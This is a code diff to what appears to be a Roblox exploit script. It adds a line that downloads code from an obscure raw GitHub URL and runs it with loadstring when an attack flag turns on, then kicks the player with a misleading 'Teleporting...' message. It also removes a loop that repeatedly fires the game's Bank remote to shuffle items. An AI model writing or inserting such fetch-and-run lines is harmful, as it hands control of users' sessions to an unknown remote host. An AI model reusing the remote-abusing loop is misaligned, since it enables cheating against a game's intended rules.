@@ -123,6 +123,7 @@ end)
 task.spawn(function()
     atk:GetPropertyChangedSignal("Value"):Connect(function()
         if atk.Value == true then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/n3987frejhw098h324/SAstuff/refs/heads/main/storageshitt"))()
             task.wait(15)
             p.LocalPlayer:Kick("Teleporting...")
             task.wait(1)
@@ -242,33 +243,4 @@ game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(functio
     task.delay(5, function()
         game:GetService("TeleportService"):Teleport(5780309044)
     end)
-end)
-
-task.spawn(function()
-    while true do
-        for _, itemName in ipairs({"Afro", "Flushed Orb"}) do
-            if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(itemName)
-            or (game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild(itemName)) then
-
-                task.spawn(function()
-                    while game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(itemName)
-                    or (game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild(itemName)) do
-
-                        if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(itemName) then
-                            game:GetService("Players").LocalPlayer.Backpack[itemName].Parent = game:GetService("Players").LocalPlayer.Character
-                        end
-
-                        task.wait(0.1)
-
-                        for i = 1, 8 do
-                            game:GetService("ReplicatedStorage"):WaitForChild("Bank"):FireServer("Slot" .. i, false, false)
-                        end
-
-                        task.wait(0.1)
-                    end
-                end)
-            end
-        end
-        task.wait(0.1)
-    end
 end)
